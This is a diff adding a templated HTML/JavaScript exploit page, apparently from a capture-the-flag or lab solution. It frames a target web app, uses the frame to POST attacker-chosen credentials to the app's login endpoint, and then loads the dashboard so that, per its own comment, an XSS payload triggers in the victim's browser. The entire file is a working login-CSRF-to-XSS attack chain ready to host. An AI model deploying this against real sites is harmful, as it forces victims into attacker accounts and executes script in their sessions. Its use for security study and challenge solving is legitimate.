@@ -1,0 +1,23 @@
+<iframe id="x-frame" src="{{ app_url }}/"></iframe>
+<script>
+  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+  x = async () => {
+    xframe = document.getElementById("x-frame");
+    xframe.contentWindow.fetch("{{ app_url }}/api/login", {
+      method: "POST",
+      mode: "no-cors",
+      credentials: "include",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        username: "{{ username }}",
+        password: "{{ password }}",
+      }),
+    });
+    await sleep(1000);
+    xframe.src = "{{ app_url }}/dashboard";
+    // xss should trigger now
+  };
+  x();
+</script>
